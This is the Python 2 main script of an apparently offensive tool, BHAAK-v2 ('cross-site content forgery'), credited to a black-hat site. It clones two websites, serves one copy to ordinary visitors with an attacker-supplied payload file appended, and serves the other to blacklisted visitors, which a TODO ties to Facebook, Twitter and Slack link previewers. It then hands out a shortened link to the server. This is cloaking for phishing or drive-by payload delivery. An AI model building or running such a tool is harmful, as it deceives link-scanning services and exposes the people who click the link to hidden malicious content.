#!/usr/bin/env python2

### BHAAK-v2
### XSCF - cross-site content forgery
### www.blackhatacademy.org
### rip d1zzy

import sys
import os

from lib import shorten,cloner,server

if os.geteuid() != 0:
	sys.exit('You are not root!')

configs = open("conf/ak.cnf", "r").read().splitlines()

normal_clone = None
blacklist_clone = None
googl_key = ""
ftp = True
payload = None

try:
	for line in configs:
		if "normal_clone" in line:
			normal_clone = line.split("normal_clone: ")[1]
		if "blacklist_clone" in line:
			blacklist_clone = line.split("blacklist_clone: ")[1]
		if "googl_key" in line:
			googl_key = line.split("googl_key: ")[1]
		if "ftp" in line:
			ftp = line.split("ftp: ")[1]
			if ftp == "False":
				ftp = False
			else:
				ftp = True
		if "payload" in line:
			tmp_pl = line.split("payload: ")[1]
			if tmp_pl == "None":
				payload = None
			else:
				try:
					payload_fd = open(tmp_pl, "r")
					payload = payload_fd.read()
					payload_fd.close()
				except Exception,err:
					print "Could not load payload file: " + str(err)
					sys.exit()
except:
	print "Malformed config file detected. Exiting!"
	sys.exit()

if (normal_clone == None):
	print "The 'normal_clone' config parameter was missing - exiting!"
	sys.exit()
if (blacklist_clone == None):
	print "The 'blacklist_clone' config parameter was missing - exiting!"
	sys.exit()

print "Site to clone for normal users: " + normal_clone
print "Site to clone for blacklisted users: " + blacklist_clone
sys.stdout.write("Cloning...")
sys.stdout.flush()

cloner.clone_site(normal_clone, "normal.html")
cloner.clone_site(blacklist_clone, "blacklist.html")
normal = open("tmp/normal.html", "r").read()
blacklist = open("tmp/blacklist.html", "r").read()

if payload != None:
	#normal = splice.splice(normal, payload)
	normal += "\n" + payload

print "done."

shortened = shorten.shorten(googl_key)
print "Link to your server: " + shortened

server.webserver(blacklist, normal, ftp)

#TODO: shortener with api key function is a stub, write it
#implement ftp (save ip from blacklisted ua, may work out of box with FB, Twitter, and Slack) 
